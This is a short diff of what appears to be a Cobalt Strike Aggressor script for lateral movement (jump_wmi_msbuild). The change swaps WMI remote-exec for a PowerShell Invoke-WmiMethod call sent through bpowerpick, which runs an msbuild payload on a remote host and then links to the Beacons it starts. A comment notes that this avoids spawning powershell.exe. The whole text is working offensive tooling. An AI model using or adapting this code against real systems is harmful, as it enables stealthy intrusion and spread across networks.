@@ -234,11 +234,11 @@ sub jump_wmi_msbuild {
 	##########
 	$command = $msbuild . ' ' . strrep($payload_dir, "$", ":") . $msbuild_payload_filename . ' /noconsolelogger';
 	## Do all through remote-exec WMI (this method uses powershell.exe in CS4.1, but 4.2 now uses an inline BOF to accomplish the same goal)
-	bremote_exec($1, "wmi", $2, $command);
+	#bremote_exec($1, "wmi", $2, $command);
 	
 	# Execute msbuild via powerpick for CS 4.1 if we don't want to spawn powershell.exe (make it silent with ! after bpowerpick, but you will lose errors from the WMI execution
-	#$psh_command = "Invoke-WmiMethod -Computername $2 -Name Create -Class Win32_PROCESS \"$command\"";
-	#bpowerpick($1,$psh_command);
+	$psh_command = "Invoke-WmiMethod -Computername $2 -Name Create -Class Win32_PROCESS \"$command\"";
+	bpowerpick($1,$psh_command);
 	
 	## Link to TCP\SMB Beacons
 	beacon_link($1, $2, $3);
